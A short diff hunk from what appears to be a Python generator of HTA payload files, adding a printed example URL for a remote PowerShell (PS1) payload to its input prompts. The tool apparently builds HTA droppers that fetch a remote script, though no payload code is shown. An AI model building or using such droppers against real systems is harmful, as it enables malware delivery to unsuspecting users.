@@ -14,6 +14,7 @@ print("""
 html_title = input ("Choose an HTML Title >>")
 app_name = input ("Choose App Name >>")
 payload_n = input ("Payload Name >>")
+print ("Example: http://example:80/Payload.ps1")
 URL = input("Enter Full URL with PS1 payload name >>")
 
 hta_payload = payload_n + ".hta"
